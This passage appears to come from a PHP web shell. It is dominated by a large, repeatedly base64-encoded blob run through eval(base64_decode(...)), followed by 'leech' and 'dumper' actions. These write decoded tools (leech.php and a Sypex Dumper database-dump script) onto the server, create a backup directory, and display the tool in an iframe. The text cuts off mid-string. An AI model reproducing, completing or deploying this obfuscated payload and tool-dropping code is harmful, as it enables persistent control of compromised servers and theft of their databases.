VnNTbWxsYldoT1ZGY3hibVF4YkhOYVJFNU1UVVpLVTFscVFuZFNSbHBKV1ROYVUxSnJXakpWTW5S
UFYwWk9kV0pIUmxkTlJuQTFWa1JPYW1ReFRYZFViRXBPVWxoU1JWWnFRVEZpTVd3MlUyeGFZVTFI
T1ROV1J6QTFZVEZrU0dWSVRscGlXRkpVV1RCV2QwNXRTWGxhUlZaV1ZucHNURlZVUms5Vk1YQnpW
bGhrVjJKR1NsZFVWV1EwVlZaYVNHVkljR2xpUlhCSldXdGtiMVZyTVhSaFNHUlVZV3RXTTFReFZu
ZFNNRGxYVW14V1RsWlVWbGRXYWs1ellURktXRkpzYUZOaE1VcHZWV3BLTUdSV1pFZFZibkJWWVRB
MWRWbFVRbmRUTVVweFlrWldWbUpHY0ZCV2ExcFBWbXM1Vms5V2FHeFdNVXBYVmpKNGFrMVdTbGRp
Um1oUFZucFdWbGxzWkc5aU1XdDNWRzEwWVZKclNsVldWekZoVm14S1ZXSkdWbGRoTVhBMldXMTRZ
Vk5HV25WV2JFNVRUVVp2ZUZZeWNFSk5WMGw0WWtac1VsWjZWbHBXYTJoUFZERkZlVnBJU2xSaE0w
SklWREZhVTFVeFduSk9WbFpXVFZaVk1WWkVSbXRPVm5CR1RsWndXRkpyY0U1WFZsWnJVakF4Vm1J
emFFNVNSM2hNVlcxd2MxVnNXa1ZTYXpsWFZtMVJNVmRyVlRGWGJHUkhVMnN4V2xaWFVraFVWbFoy
WlVVeFJWcEZWbFpXZW14TVZWUkdSbVF4VFhkVWJFcG9UVzVTVTFSWE1XNWxSbkJYV2taa2ExWnJj
RWxaVkU1VFZWZEZkMDVZV21GU2JXaDZXV3RrUzJOR2IzbGtSbXhPVmxWd1VsWnNVa2RWTVd4eVlq
TmtWbUpyU21GV2JGVXhaR3hzVjFSdGRHRlNXR2hGVmxjeFlWWnNTbFZpUmxaWFlURndObGx0ZUdG
VFJscDFWbXhPVTAxR2IzaFdNbkJDVFZkSmVHSkdiRkpXZWxaYVZsUk9hMk5zWkVWU2EwNVdVbXhX
TkZaWE1VdFRNREZGVW0wNVlWSldXWGRaYWtaelYxWmFXRTVXYkZaTk1sSjVWakJTUjFFeFZrZFdX
R2hXWWxWd1RGUldXa3RpTVd0M1YyeE9hbEl3Y0hkWGEyUlRWRlpGZUZOdE1WZFdWbFV4Vm10YVlW
SXlUWGxPVm1SVVVteHdWMWRXVm05V01WSjBWV3hvVlZaNlZscFdWRTVyWTJ4a1JWSnJUbFpTYkZZ
MFZsY3hTMU13TVVkVGJrNWFZbGhvVkZscVNsTldhekZWVW14d2JGWXhTbkpWZWtaVFpXeFNjbFJ0
TldoTlNFSmhXVzEwZDJNeFpGZGFTSEJQVFVaS1Uxa3dVbk5TVmxaWVQxVTVVazF0VGpOVmVrWnla
VmRXU0dGSGNFNU5SRVoxVmxaU1MySXdNVmhXYkdoWFlteGFWRlZxU2pCVU1VVjVUbGh3VldFd05Y
VlphMk40WVRGYU5sWnVSbUZTVjFKNldrY3hTMk5HUm5KV2JIQlhaV3hhTWxac1VrdFNNa1owVW10
U1lVMXVVbGhWYWtwdVpVWmFSMkZHWkdoaE0xSlRWRlZXTUZKR1pFbFVhemxTVFcxU2VWVXlkSGRT
TVZaMFQxZDBWMVpGVmpSV01XaDJaVWRTZEZScmFGZGliRnBvVldwS05FNVdUWGRVYkU1WFZqQmFT
bFp0Y3pGaE1WbDNUVmhrVlUweVRqTlZla0pQVlcxS1JWUnRhRk5OYm1nMlZqSjRUMkp0UlhoWGEy
aG9VakpvY0Zsc1pHOVZiR3hXV2tWa2ExWnJTbHBWTWpFMFYyeFplRk51U2xwV2JXaExXV3BDZDFJ
eFZuUlBWM1JYVmtWV05GWXhhSE5qYlU1R1ZXeEthVTFJUWtWV01HaFBWREZGZVZwSVNsUmhNRFZW
VmxkME5GbFdaRWRUYkU1aFVtMVNTRmRYZUc5V1ZURklaRVprVTAxdGFIWlhWekI0WWpGV1dGSnJh
Rk5pYkZwUldraHdRMVJHUlhoU2JrNVFWbFpLVTFscVFuZFNSbVJHVGxSS1drMXFWbE5aYWtKM1Vt
MVNTR1ZIZEZOaE1XdzBWakZhVDJOck5IZFZiRXBwVFVoQ1JWWXdWbmRqTVhCR1lVWmtiRll3Y0hk
VlZtUXdWa1V4YzFkWVpGZFdiV2hZV1ZWVk5VMHdNVVprUlZKWVVrVktVRlZVU210ak1rcFlWV3hv
VDFZelFuSlZha28wVFd4c2RHSkZUbE5TTUZwS1ZtMXdWMWxXV2paVmJscFVZVEZhVkZrd1duTldi
RkowVDFkb1ZrMHlVbmxXYlhSclZqSlNWMU5yYUZOaWJGcG9WRlZTVjJSc1pGZGhSVXBxVFVoQ1Ix
UldaRzloTVVwWlZXNWFXRlp0YUZkWmVrSjNVakZXZEdGSGNGTmlSWEF6VjFjeGMwMHlSWGhYYTJ4
WFlrWmFiMVV3V21GVU1YQkhXa1UxYWsxSVFrZFdWekUwWVZkS1IxTnVXbUZTYkZZMFZGWmFjMDVY
UlhkT1ZWSmhUVzVqZWxWcldrZGtiRTV5Vkd4U1ZtRnJTbTlWYWtvMFRteFNSMVZVUmxWU2JrSmFW
bGR6TldGVk1YUmplbFpXVmxkU2FGUlZaRTlTTURsWVkwZHNUbUZzV1hoV01uaHJWREF4Um1SRlVs
WmhNVnB2Vm1wQ1lWSldiRlphU0VwcVVsUnJlbFJWVmpCU1JsWllaVWhrV0dKWGVFTlpha0p6Vm14
R2RFMVhkRlJTVlhCMFYxZDBhazVYU25SU2JHaFBVbnBzVEZVd1drdGtiR3hYWVVVMWExSnJTbmxh
UldRMFlURktWVlpxU2xwV2F6UjZXVlJHWVZOR1duVldiRTVUVFVadmVGWXljRUpOVjBsNFlrWnNV
bGRGTlV4VmJGSkhZakZ3UmxacVFtbE5WM2hhVm14b1ExUkdWbFZSYTNoU1RWVmFlbFJxUWxOVmJV
bDNZMFZTVmxZemFIcFdNVkpMWWpKU2NtSkZVbUZTV0dodlZWUkdjMk5XVWxoalJrcE9VbFJvTlZS
c1l6RlRiRVY0WWtoR1ZWWXpRbkZhVjNNMVRsWmtXR05GTldoaVJsVjRWa2h3U2sxWFNuSmlSV2hQ
Vm5wc1RGbFdWWGRsYkZGM1ZXeGFiR0Y2YURaVlZtUnJVekpHVmsxVVZsVmlia0pQVkdwQ2QyTkdV
bFZSYXpWc1lUSnplbFV5TVhOVWF6QjNUMVpXVWxaRk5WRlVWM040WW14d1NHSkdjR2hoZWtaNFZU
RlNRMVZGTVhGaFJ6VmhVbFUxWVZsWGMzaGpWazVWVVd4Q1RtSllVblZYVmxKTFlqSlNjbU5JUWxW
V1JUVlJWV3RhUjA1c1VqWlRWRUpoVFZWd2VsWlhlRWRUYkZWNVZGUk9VMUpyV2pKVk1uUlBWVzFL
U1dKSFJsaFNhMncwVjFSSmQwMUdiM2hqU0ZKVFltczFjVlJYZUZaTk1VcEhVbTVhVkdFd05WcFVW
VlV4VWtadmVXUkZkRlJoTVhCVVdWVmtUMUl4Vm5WUmJXeG9ZV3RhZWxkc1ZtOVJNazE1VTFoc1Zt
SllhRTFWVkVwT1RURk9kV0pFVG1oTlZuQkpWVzAxYTFZeFNYbGxSRVpVVFZaS05sWkhkRTlpYlVW
M1kwWndXRkpZUVRGV01WcHZZekZ3ZEZScmFGQlhSMUpOVlZSR1MxWnNaRmRoUlU1WFZqQmFXVlJy
YUVOVlIxSTJVV3Q0VWsxVlducFpiR1JLWld4T2RHVkdjRmROUkZZeVZYcENUMVV4V2xkaVJteFNZ
a1phYjFadWNGTmliR1JYWVVVMVlVMUlRa2RYYTJoRFYyeGFjMU5xVmxwV2F6VjVWa2QwVDJKdFJY
ZGpSM2hyWld0S1RWVlVSa2RqYkU1MFVteG9XRll5VWsxVmFrbzBUbXhrUlZOc1RtcFNNRFYzVjJw
S01GWXhUa2RYYkZwYVZsZG9XRlpITVZOWFJsSlpWbXQwYkZaSGFERldSV014VkRBeFNGUnVVbWxU
UjFKeFZGYzFiMkl4YkRaVGJUbHBVakEwTVZkcVNqQlZNREYwWlVjNVYyRXlhRXhaTUZZd1ZrZEZl
bEZyVmxaV2VteE1WVlJHUjJNd05IZFZiRXBwVFVoQ1JWWldaREJUTVdSeldrVTVhVTFyYnpGVlZt
TXhWVlpKZDJORVZsUldWVEF3VTNwR1ExTkdUblZpUlhCU1pXMWtlVlp0ZEU5WGJVWnlUbFJhWVdW
clNrOVdhMmhUVFd4T1ZtRkdUbWxOU0VKM1ZrWlNRMVJ0Vm5KaGVrNVVWbGRPTTFsc1ZuTk9iR3cy
Vm1zMVUxSXpUWHBXTVdoelVXczVSMkpJUWxKaWJrSnlWVEJrTkdWc1pITlZXR1JvVm0xME5WUXhh
RTloVlRCM1lYcEtXR0ZyTlV4WmExcDNWMFUxU0dKR1JtaFdNRFUyVlRKMFYyRXlUa2RpUm1SV1lt
MTRiMVpVVG10a1ZsWkdWRlJXYUZaclNuZFhXSEJyVWxaV1dFOVZkRkpOVlZwNVZUSjBkMU5XVm5S
UFYyaFlVbFJGZDFaVlpETk9Wa3BJVW10c1YyRnNXbWhXYm5CVFpHeE9jbGRzVGs1V2JIQkpXVlZT
UjFaV1pFZFhia1pWVWpKNGNWcEhkSGRPVlRWSVpFWk9UbUpZYUhaV2JYUnZVekpPUm1WRlVsWmhN
VnBvVm01d1YxWnNiRlpoUm1SVllsWktXVlpHYUZkVE1sWlZZVWhXVlZJeWVGUlZNR1JIVjBaS2Mx
WnRjR2xXTTFJelZrUk9hbVF4VFhkVWJFcG9UVWhDZEZaV1VrTlVSa1Y0VW01S1ZHSklRbGxhVldo
M1dWWldWVkZyZUZKTlZWcDVWVEl4VjAwd01VWmtSVkpXVmpOU1RGVlVSbXRXTWtaMFVtdG9VRkl5
VWt4YVZ6VnZZMFpyZVdKNlFtbFdWM2N5VlRGU1QxUnRSblZWYlRsYVlsUkdjVmRxUm5KbFYwWkZV
bTE0VmsxWGVIaFdSelYzWW1zd2QwNVdWbXRUUmxwTFZUQmFSMlJHVGxsalIzQlBVbFJXVmxaR1Vt
dGhiRVYzVTFoa1dsWnRUWGRYYWtaRFUwWk9WR1JGZEd4WFIyY3lWMnRXYjFNeVRraFVhMnhWWW1z
MVlWWXdWVEZrYkdSellVVTFhVTFJUWtkWGEyaERWMnhhYzFOcVZscFdhelY1V2taV2QwNXRVWHBY
YkhCb1lXeEtkVlpGV2s5UmJVcHlUMVJPVGxKWVVrVldWbVF3VXpGRmVGbDZWbWhXYldRMVZqSTFU
MkV4WkVaT1dGcFVUVVUxZVZScVFsTlZiVWwzWTBWU1ZsWXpVa3hXTWpCNFRrVXhXRlJZYkdGTmFt
eE5WbXRvVDFReFJYbGFTRXBVWVRBMVUxbFVRVEZTUm05NVpFVjBVazFWV25wWk1GcDNZMFpHV0U5
V1NsTk5Wemt6VjFSQ1drNVhTbGhVYTJ4WFlXdEtUVlZVUmtwa01XeFdXa2hPYkdFemFGWlViRlkw
V1Zaa1IxTnNRbHBoYTNCNVdYcENkMUpzVm5SbFIyeHBVbXR3TWxkcldsWmxSVEZYWWtSV1QxSjZW
azVhVm1SUFRWWnNObFJzVG14V01GcGFWVmMxZDJGV1NYZFhhbHBhVmxkU1dGcFhkREJTUmxaeVlV
ZG9WMDFHY0ZkWFZFbDRZMjFPUm1WRmFGaGliSEJ4VldwR1lVMVdUWGRVYkU1WFZqRktXRlpYTURW
aE1WcFZVbGhvV0ZkSGMzZFpiWFEwVGxacmVsWnRjRTVOVlc4eFYxWmFiMUV5Vm5SVGEyaFRZbTVD
YjFWcVJtRk9iRTEzVkd4T1ZGSXdXbGxWYlhoWFlXMUtXR1JJWkZWU1ZUVnlXbFpXZDA1WFJYcFVi
RTVwVW10d1UxWXdVa05UTVU1elZXNUtVMkpGTlZsV1ZFb3daREZLUjFKdVdsUmhNRFZUV1ZSQ2Qy
SkhValpSYTNoU1RWVmFlVlV5ZEU5VmJVcElaVVp3VG1KWFozbFZNVlpQWVdzNVIySklRbEppYmtK
eVZUQmtOR1ZzWkhOVldHUm9WbTEwTlZReGFFOWhWVEIzWVhwS1dtRnJOVXhaVldSTFpFWndTR1ZG
Y0doaGJFb3dWVEZvZDFOck1IZE5XRVpxVFdwR1MxcFhkSE5PVmxKMVkwaHdZVTFYZERWWlZWSkhZ
a1pWZUdKSVJsVmlia0oxVkZSQk1WWlhVa2xXYkVaU1pXMTRkMVpWWkhOUmJVcHlaVVZzVldGclNu
RlpiR1EwVFRGc05sTnFVbWhTTURFMVdWVmtOR0Z0VmxoYVNFcFdZV3R3ZWxsVldtRlRWazUxVVd0
NFZrMHlVakZWTVZaT1pERnZkMk5FVm14U2VrWnZWbXBPYjJNeGJEWlRiazVQWWtoQ1ZWZHFTakJX
TVU1SFYyeGFXbFpYYUZoV1J6RlRWMFpTV1ZacmRHeFdSMmd4VmtWak1WUXdNVWhVYmxKcFUwZFNj
VlJYTlc5aU1XdzJVMjA1YVZJd05ERlhha293VlRBeGRHVkhPVmRoTW1oTVdUQldNRlpIUmpaaVJr
WlhVbFZhZFZaVmFITlJiVlpHVFZWV1VsWXlVbEZaVmxaTFpFWndSbUZGVG1GaVZURTFXV3RTWVZs
V1ZYbGFTRXBoVWxkU2Rsa3daRTlPVlRGRVpFWlNUbUpHYkROV2EyTjNUbGRPUm1WRlVsWmhNVnBv
Vm01d1YxWnNiRlpoUm1SVllsWktXVlpHYUZkVE1sWlZZVWhXVlZKNlZsQlVWV1JQWkVkS1NWcEhj
RTVpYldoMlYxaHdTMkl5U2toVWFsWmhUVzVTVkZSWE1UUmlNVnB5WVVWMGFsSllVbFZaVkU1aFdW
ZEtXR1ZJY0ZoaVIyaFFXVEJrVjJSR1dsaFBWWFJUWWtWc05GWnRkR3RpTURGWFZXeHNWMkpZUWs1
WlZtUlBUV3hPZFdGNlJteGlWa3BLVlRJMVEyRnNUa1pPV0hCWVZtMW9VRmxxUm5kWFZsSllUMVYw
VTFZeFNqTldNVnBoVlRKV1dGSnNVbWhOTUVwTldWZDBWMDB4VWxaVWFrNXBZVE5DVlZkWWNHdFNW
bFpZVDFWMFVrMVZXbmxWTWpGaFZXc3hSbVJGVWxaV00xSk1WVlJHYTFZeVRYbFVXR3hYVmxSV1JW
ZHFTakJUTVVWNFVtNU9UMDFHU2xOWmFrSjNVa1pXV0dSRmRGSk5WMUpZV1ZjeFIxTkZPVWhhUlhS
c1ltMW9kMVV4Vm05VU1ERklWbXhvYkZJemFGSldWRUozWTFac2NWTnFVbXRpVlRWNFdXcEtkMWxY
U2xkalNGSllZbFJHYUZsc1ZuTmpWVFZXWlVkb1VrMVhlSGhXUm1SM1ZXc3hSazlJYkU5V2VsWkxW
VEJhUzJSc1RuUmlSVFZPVFVSc1JsZFljRWRWUjFaV1UyNUdXbFpYYUZoVWJGWjNZMFpTVlZSc1Fs
TlNNREUwVmtod1NrMUZPVVprTTJ4VVZUTlNURnBYTlU5VU1VVjVXa2hLVkdFd05WTlphMUp6VWxa
V1dFOVZkRkpOVlZwNlZERldVMVZ0U1hkalJWSldWak5vZWxZeFVrdGlNbEp5WWtWU1dtVnRhSEZV
VjNNeFRsWnNWMkZGVGs1U2Ewb3dWbGMxWVZkck1IaFhha0pZWWtkTmVGUlZWalJrUms1MVYyMUdW
Rkl6VVhoWFdIQkxWREpXV0ZOWWJHeFRSVFZZVlc1d2MwMHhWa2RhUms1cllrZDBObFp0TlZOWlZs
bzJWbGhrVlZKNlJreGFSM2gzVTFkRmVsWnRjRTVoZWxVeFYxZHdTMDVIVFhoVWEyaFhZbXRLYUZS
WE1XNWtNVlpHVkZSV2JHSkhkRFpWTWpWRFlXeE9SMUpZU2xSaWJrSTJWa2QwVDJKdFJYZGpSVkpY
WlcxNGQxWXdVa3RaVjAxNVZXeHNWV0pVYkUxVlZFcDZUVEZLUjFKdVdsUmhNRFZUV1d0amVHRldU
a2RYYWxwYVZsVTFkVmt3VlRWTk1ERkdaRVZTVmxZell6RlZhMXBIWkd4T2RGZHNTazVTV0ZKRlZs
WlNRMVJHUlhoYVIwWk9WakJ3TUZaSGNFTmhSbG8yWWtSR1ZGWldhekZWYTJSSFUxWmFjVlp0Umxk
bGJFb3lWVEowWVZVeVNYbFZiRnBPVmtWYVlWcFdhR3RqYkZaVlUyMDVUbFl4V2xsV2JUVlhWVEZK
ZUZkcVJsUk5WVll6VlhwQ1QxZFhUWGRPVlZKaFRXNVNURlpXVm10WlZURklWR3RrVUZkR1NtOVVW
M2hMWkRGcmVXSkhOV2hOYkVwSldWVm9RMkZ0VmxWUldFcFdaV3R3V0ZSVldsTmtSVGxaVVdzeFVr
MVZjRVpYVmxadlZqQTFWMk5HYUU5V1ZscG9WbTV3VTJReFVYcFpNMlJVVFVVMVUxbFVTakJWTVVs
M1YycEdXbFpXY0ZCWlZWcHlaVlp3Tm1KRmRGUlNhM0F5VjFaYWIxUnRVa2RSYmtwV1lsZG9jRmxz
Wkc5V1ZtUlhXa1U1YVUxSVVrVldWM2hYWVVaT1IxZHJPV0ZTYlZKUFdUQlZOVTB3TVVaa1JWSldW
ak5vTUZkWGNFOVRNa3BIWWtab1ZXSlViRTFWVkVaTFVteGtWMWw2Um1sTlZsWTFWVzB4ZDJGR1JY
ZFRiVGxhVFRKNFExbFVSa3BsVjBwSVlVWmtWRkpZUWpOVmVrWkdaREZOZDFSc1NtbFNSMUpHVmxa
ak5WTXhSWGhTYms1cVVtNUNkMVZXWXpWaFJtUkdUbGN4V0dFeVVucGFWbFl3VWtaV2MxWnRhRlJT
YkhCUVYydGFhMVJ0VWxaalJGWlFVbnBXVGxsV1drdFRWbXhYV2tWa1YxWXdOVEJaVkU1RFUyeEZl
R0pJVWxSV1ZUVlVWVEJrUjFkR1NuTldiWEJwVmpOU2RsWlZXazloYlZKV1pVaENXazF0VWt4WlZs
cHpZbXhPY2xadGRHcFNiWGhZVmxjMWMyRkdWWGRXVkZaVVltMXpkMWx0ZERCVmF6RkdaRVZTVmxZ
elVreFhiR2hxWkRGTmQxUnNTbWhOU0VKRlZtcEdZV05XYkZaWmVsSmhUVWhCTWxwVlpITmhiVVpX
VW1wS1ZsSXpRVEJaVm1SUFkwWkdXVmRzUm1sU2Exb3dWVEZvZDJGck5VWk9WVlpUVmtkU2NGcFdW
a3BrTVd4V1ZHeHdhR0Y2VmtaV1JtaHpWVWRXVmxOcVFsUmlWM2hQVkZSQk5WWldSbFZXYkVKT1lY
cEdkVlpWVm10VGJHOTVWRmh3Vm1Gc1duQlZha1pXVGxaT1dFMVZPV3RpVlhCSlZERm9jMVZIU2xo
VmFsWllZa2RTV0ZwR1ZuTmpWVFZJVGxVeFVrMVZjRXBYVmxwclVqRmFXRlJ1VW1oTk1EVk1XbGMx
YTAxc1pGaGlla0pwWVhwcmVsUlZWakJTUmxaWVpFVjBVazFWTlZSVVZXUkhVMGRLU1dORk1WZFNS
bHAwVmxaU1MySXdNVmhXYkdoWFlteGFUVlZVUmt0V2JHeFdZVVprVldKV1NsbFdSbWhYVXpKV1ZX
RklWbFZTTW5oVVZUQmtSMWRHU25OV2JYQnBWak5TTmxVeWRGZFVNa2w1Vld4c2FWSXphSEJaVkVa
TFl6RnNkR0Y2UW1saE0yY3hWMVJPVjFNeFNsaFZibVJZVm14d1ZGcFdaRWRXUjBZMldrVldWbFo2
YkV4VlZFWkhZekE1VmxWc1NtbE5TRUpGVmxaa05HTXhiSEpoUlRscFVqQmFXVll4Wkd0VVJrVjRV
MnRzV2xadFVraFdiR1JQWkVkRmVXRkdSbFpOYXpSNFZrVmtjMkZzYjNkalNFSllWakpTVEZWc1pG
TmtNV1JYVjJ4T2JGWXdXbFZWYkZKelV6SldWVlZ1VmxSTlZWWXpWWHBDVDFWdFJYZGpSM2hyWld0
S1RWVlVSa2RqYkU1eVZHeG9WMkpZUW05VmJuQnZZbXhPZFdORVVtaFdNRFY0Vkd0amVGTnRWbkpo
TTNCVlZqTkJkMWxWWkV0a1JtdDVXa1p3VG1KWFpEUlhiRnBQVjIxR2NrNVVXbUZsYXpWUVZtdG9V
MDFXVGxaaFJrcHBWbGQzTWxkWWNGTlVNVnBHVFVST1drMUZOVVJVVldSSFYwVTFTRnBHUmxOTlIz
UjVWVEkxYzA1SFZuUlZhMnhVWW10S2NWVXdWVEZsYkdSWFlVVTVhVTFZUWxwV1JtTTFVekZLV0ZW
dVpGaFdiSEJVV2xaa1IxWkhSWHBXYTNSc1ltMVJlVll4WkhaTlJtOTNaVVpTVWxaNlZsRmFTSEJE
VkVaRmVGSnVTbFJoTURWWlZERmtjMWRWTVhOalNIQmhVbTFvVUZscVFqQlNSMFkyV2tWV1ZsWjZi
RXhWVkVaSFkyeE9jMk5JVW14U1JWcHhWRmN4YTJSc1RYaFZibkJWWVRBMWRWbFVRbmRTUmxaWVpF
VTVVazF0VW5sVk1uUlBWVzFLU1ZGdFJtaFdWVm95VmxaV2ExbFZNVWhVYTJSUVZucEdjVlV3V2xw
a01VMTNWR3hPVGxJd1drbFphMmgzVkZaYVJWWnJNVmhpUjJoVVZrUktTbVZYUlhwVWEzUlRWbFJX
TWxkcldtOWpNa3BJVTI1S1ZtSllhSEJaVmxKVFpGWlNTV0pIY0d0V01ERTJWbGMxYzJGR1pFWlRh
bHBhWVRKU1NGcFhNVWRUUmxwMVkwVjRVazFWY0VwWFZscHJVakZhV0ZSdVVtaE5NRXBPVldwR2Qw
MXNhM2RhUm1SclZsaFNSVlpYZUZkaFJrNUhWMnM1WVZKdFVrOWFSbFozVGxVNVNFNVZNV2xoZWxJ
elYxUkplR015VVhsVVdHeHNVakpvY1ZSWE1XOWpNV3Q2WWtjMWFFMVZiRFZaYTJSdlZqRk9SbU5J
WkZSTlZUUjZXVzB4VDJOR2EzcFJhekZUVm01Q1YxWnNWbHBPVmtWNFZHeGFUMVpWY0ZkWmEyUXda
REZOZUZKWVpGUk5SVFZUV1ZSQ2QxSkdaRWxVYXpsU1RXMVNlVlV5ZEU5VmJVVjNZMGRHVjAxRVZq
SlhWelZ6VVcxS2MxRnJhRlJXTWxKeFZGUkdTazFXYkhKYVJscFFWbGQ0TUZaSE5XRmhWa28yWWtS
V1ZVMXFWa3haYTFwM1VrWk9WR1JGZEdoV1ZFVXhWa2MxZDFOck5IZGpTRUpWVjBkNFQxbFhNVTVO
TVU1V1drVTVhVTFzU2xwWlZFbDRVMjFXZEZSVVFsVmlia0pYVkdwS1MyTlhVWHBYYkhCb1lXeEtk
VlV5TlhOT1IxWjBWV3RzVkdKclNuRlZNRlV4Wld4a1YyRkZPV2xOV0VKYVZrWmpOVk14U2xoVmJt
UllWbXh3VkZwV1pFZFdSMFY2Vkd0MGJGWlZXWGRWTVZaUFlXMU5lR05JVW1sVFJUVm9WakJWTVdR
eGNGaE5WbHBwVFVoQ1NGWlhNRFZoTVZwVlVsaG9XRmRIYzNkWmJYUTBUbFpyZWxadGNFNU5WVzh4
VjFaYWIxRXlWblJUYTJoVFltNUNiMVZxUm1GT2JFMTNWR3hPVkZJd1dsbFZiWGhYWVcxS1dHUkla
RlJOVmtWM1drUkNjMUpWT1VoYVIwWnBZa1Z2ZWxZd1VrOVVNazVJVm01U1YxWjZiRXhWTUZwTFpH
eHNWMkZGTld0U2EwcDVXa1ZrTkdFeFNsVldha3BhVm1zMGVsbFVSa1psVjBaRlVtMTRWMDFXYjNo
V1YzUnJWakpTVm1WSVFscE5NWEJNV2xaU1YwNXNjRVpoUlhScVVqQTFTbFpITlU5WGJHUkdUbGhh
V0dKSGFFOVpha0ozVW14d1NWRnNjRmRpUlc4eFYxWmFUMk50VGtaa00yeFlZbXRLY0ZWcVJtRk9i
R3hYWVVoa2FWSllVa1ZXVjNoWFlVWk9SMWRyT1dGU2JWSlBXa1pXZDA1Vk9VaE9WVEZwWVhwU00x
ZFVTWGhqTWxGNVZGaHNiRkl5YUhGVVZ6RnZZekZyZW1KSE5XaE5WV3cxV1d0a2IxWXhUa1pqU0dS
VVRWVTFlVmt4VlhoV1ZrWlpXa1Z3VTFKNmJIVldSbHBUVVcxUmQyVkZVbHBOYm1oTVdsYzFUMVF4
UlhsYVNFcFVZVEExVTFsclVuTlNWbFpZVDFWMFVrMVZXbmxWTW5oM1YwZFdTV05IUmxaV1JVcE5W
VlJHUjJOc1RuSlViR3hxVFVSV1JWZHFTakJUTVVWNFVtNUtWR0pJUWxsV1J6QTFZVmRXVmxKdVZs
WlNWMUpMVjJwS1RtVnNWbkZXYld4VFRWWlZNVlV4WTNoVU1sSjBVMnRvVUZkSGVGRlpWbFV4WkVa
a2RFMVhSbWxXYmtJd1ZqRmtjMVZYUlhwVmJscFVZbGQ0VDFwV1ZURlNWbFpWV2tkc2FWWXdOWFZY
YTFaclltMUtWbUpFV2xwbGJFcFFXbGQ0VmsweFRsWmFSVGxwVFd4S1dsbFVTWGhUYlZaMFZGUkNW
V0p1UWxkVWFrcExZMFpLVldGRk1VNWhNblI1VlRJMWQyVnNVbkpVYlRWb1RVaENSVlpXWkROT1Zr
cEhVbTVhVkdFd05WTlphMUp6VWxaV1dFOVZkRkpOVlZwNldXdGFjbVZYUmtsWGEzQlNUV3N3TUZk
WWNFdFVNbFpZVW14c1VtRnJTbEpaYkZwTFRXeGtWVlJzWkd0U2JrSlpWR3hTUTFSWFNsWmpSRXBZ
WVRKb2VWcEdaRTVsVmxKMVlrZHNUbUp0YURaV2JYUnFUbGRSZUZGc2FGWmliSEJoVkZSR1lVMUda
SE5aZWtaT1VsaG9NRlV5TldGWlZrNUlaRVJHV21WcmNGQmFWbVJLWlZkV1NWUnNVbE5OVm5BelZq
SndTMkl3TVVkUmExSlFWMGhDWVZSVVFuZGtNV3QzWVVaS1RFMUlRVEpaZWtFeFVrWnZlV1JGZEZK
TlYwMHhXVlphYm1WV1pIVlViWFJZVWxSV01sVjZRazlqYXpSM1ZXeEthVTFJUWtWV1ZtUTBaRVpz
Y21GR1pHeGlWVnBGVjJwT1ExVkhValpSYTNoU1RWVmFlbFF4VmxOVmJVbDNZMGN4VmxaRlNrMVhi
WGhHVDFaQ1ZGbDZaRXBTTVZsNVYxWmtNMkl4YkhSU2JuQmhWa1pyZDFkRVNsTmlSbXQ1VDFkMFlW
VXlaSEpYVms1eVkwVTVOVkZUT1ZGYWVrSk1TbnB6WjFwWVdtaGlRMmhwV1ZoT2JFNXFVbVphUjFa
cVlqSlNiRXREVW1oTFUyczNTVVE0SzBSUmJ6MG5PeUJsZG1Gc0tHSmhjMlUyTkY5a1pXTnZaR1Vv
SkdFcEtUc2dQejROQ2c9PSc7IGV2YWwoYmFzZTY0X2RlY29kZSgkYSkpOyA/Pgo=
';
*/
$file = fopen("leech.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=leech.php width=100% height=720px frameborder=0></iframe> ";
}//end leech
elseif ($action == 'dumper') {
$file = fopen($dir."dumper.php" ,"w+");
$file = mkdir("backup");
$file = chmod("backup",0755);
$perltoolss = 'PD9waHAKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlwKfCBTeXBleCBEdW1wZXIgTGl0ZSAgICAgICAgICB2ZXJzaW9uIDEuMC44YiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAoYykyMDAzLTIwMDYgemFwaW1pciAgICAgICB6YXBpbWlyQHphcGltaXIubmV0ICAgICAgIGh0dHA6Ly9zeXBleC5uZXQvICAgIHwKfCAoYykyMDA1LTIwMDYgQklOT1ZBVE9SICAgICBpbmZvQHN5cGV4Lm5ldCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCAgICAgY3JlYXRlZDogMjAwMy4wOS4wMiAxOTowNyAgICAgICAgICAgICAgbW9kaWZpZWQ6IDIwMDguMTIuMTQgICAgICAgICAgIHwKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKfCBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yICAgICAgICAgICAgIHwKfCBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgICAgICAgIHwKfCBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiAgICAgICAgICAgIHwKfCBvZiB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4gICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwgICAgICAgICAgIHwKfCBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZiAgICAgICAgICAgIHwKfCBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFS